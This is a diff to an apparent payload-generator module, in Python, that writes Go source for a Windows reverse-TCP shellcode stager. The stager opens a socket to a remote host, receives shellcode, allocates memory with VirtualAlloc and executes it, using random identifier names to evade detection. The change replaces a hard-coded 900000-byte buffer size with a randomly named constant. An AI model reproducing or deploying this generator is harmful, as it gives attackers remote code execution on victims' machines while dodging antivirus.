@@ -52,6 +52,7 @@ class Payload:
         handle = helpers.randomString()
         x = helpers.randomString()
         value = helpers.randomString()
+        constSize = helpers.randomString()
 
         payloadCode = "package main\nimport (\n\"encoding/binary\"\n\"syscall\"\n\"unsafe\"\n)\n"
         payloadCode += "const (\n"
@@ -68,6 +69,7 @@ class Payload:
         payloadCode += "if %s == 0 {\nreturn 0, %s\n}\nreturn %s, nil\n}\n" %(addr, err, addr)
 
         payloadCode += "func main() {\n"
+        payloadCode += "const %s = 1000 << 10\n" %(constSize)
         payloadCode += "var %s syscall.WSAData\n" %(wsadata)
         payloadCode += "syscall.WSAStartup(uint32(0x202), &%s)\n" %(wsadata)
         payloadCode += "%s, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)\n" %(socket)
@@ -90,7 +92,7 @@ class Payload:
         payloadCode += "for i := 0; i < int(%s); i++ {\n" %(qty)
         payloadCode += "%s = append(%s, %s[i])\n}\n%s += %s\n}\n" %(sc2, sc2, sc, total, qty)
         payloadCode += "%s, _ := %s(uintptr(%s + 5))\n" %(mem, virtualAlloc, scLength)
-        payloadCode += "%s := (*[900000]byte)(unsafe.Pointer(%s))\n" %(buffer, mem)
+        payloadCode += "%s := (*[%s]byte)(unsafe.Pointer(%s))\n" %(buffer,constSize, mem)
         payloadCode += "%s := (uintptr)(unsafe.Pointer(%s))\n" %(handle, socket)
         payloadCode += "%s[0] = 0xBF\n" %(buffer)
         payloadCode += "%s[1] = byte(%s)\n" %(buffer, handle)
